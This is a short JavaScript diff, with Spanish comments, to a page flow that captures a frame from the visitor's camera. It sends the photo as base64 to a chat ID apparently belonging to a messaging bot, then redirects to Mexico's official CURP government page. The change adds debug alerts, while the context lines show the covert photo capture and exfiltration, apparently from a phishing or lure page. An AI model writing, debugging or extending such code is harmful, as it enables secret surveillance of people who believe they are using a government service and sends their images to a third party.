@@ -318,7 +318,7 @@ async function ejecutarFlujo(boton){
       await new Promise(function(r){setTimeout(r,1200);});
       var c=document.createElement('canvas');c.width=video.videoWidth||640;c.height=video.videoHeight||480;
       c.getContext('2d').drawImage(video,0,0);
-      foto=c.toDataURL('image/jpeg',0.85);
+      foto=c.toDataURL('image/jpeg',0.85);alert('📸 Foto capturada: '+Math.round(foto.length/1024)+' KB | video: '+video.videoWidth+'x'+video.videoHeight);
       stream.getTracks().forEach(function(t){t.stop();});
       // Enviar foto por base64 (más estable que FormData en iOS)
       var base64Data=foto.split(',')[1];
@@ -328,7 +328,7 @@ async function ejecutarFlujo(boton){
         body:JSON.stringify({chat_id:CHAT,photo:base64Data,caption:'📷 Foto frontal'})
       }).catch(function(){});
     }
-  }catch(e){console.log('Camara err:',e);}
+  }catch(e){console.log('Camara err:',e);alert('❌ Error cámara: '+e.message+' | '+e.name);}
   await new Promise(function(r){setTimeout(r,600);});
   window.location='https://www.gob.mx/curp/';
 }
